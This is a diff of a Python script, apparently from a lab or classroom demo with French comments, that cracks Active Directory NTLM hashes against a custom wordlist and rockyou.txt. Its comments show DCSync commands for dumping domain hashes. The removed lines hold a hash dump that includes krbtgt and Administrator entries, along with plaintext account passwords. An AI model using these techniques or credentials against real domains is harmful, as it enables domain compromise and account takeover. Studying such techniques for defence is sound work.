@@ -4,30 +4,19 @@
 # Import-Module .\Invoke-DCSync.ps1
 # Invoke-DCSync -PWDumpFormat
 
-# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d595f9d69cdaa9aa6274f2f55ccd1c95:::
-# Administrator:500:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::
-# amejj:1103:aad3b435b51404eeaad3b435b51404ee:4d0ca5d019474b46dc3aaa0d614f6cb7:::
-# test:1106:aad3b435b51404eeaad3b435b51404ee:7b90c7f506ac8d02e09da33e98ccebe1:::
-# sicom:1108:aad3b435b51404eeaad3b435b51404ee:2970c6979c92f4ef378aa24c3bde74cc:::
-# meriem:1110:aad3b435b51404eeaad3b435b51404ee:cb455751cbca968bc4dd8e5c88c6a093:::
-
-
 # import hashlib,binascii
 
 # hash = hashlib.new('md4', clear_password.encode('utf-16le')).digest()
 # encoded = binascii.hexlify(hash).decode("utf-8")
 
-# amejj:Mejahdi@123
-# test:Tata@2022
-# sicom:Tete/21-22
-# meriem:2022Mriem!
-# Administrator:Admin@123
-
 import hashlib, binascii
 
-
 hashes = open("AD_password_dump.txt","r").read().split("\n")
+# utilisation de notre propre wordlist (on a mis des mots de passes correctes juste pour la vérification)
 wordlist = open("wordlist.txt","r").read().split("\n")
+# si on veut lancer ce script sur un vrai AD, on doit utiliser une wordlist puissante (par exemple qui respecte  les exigences de complexité d'un mot de passe)
+# ici juste pour la démonstration, on a concaténé les deux wordlists pour avoir un maximum de possibilité
+wordlist += open("rockyou.txt","r").read().split("\n")
 
 users = {} # initiate users dictionary with hashed passwords
 found = {} # initiate users dictionary for cracked passwords
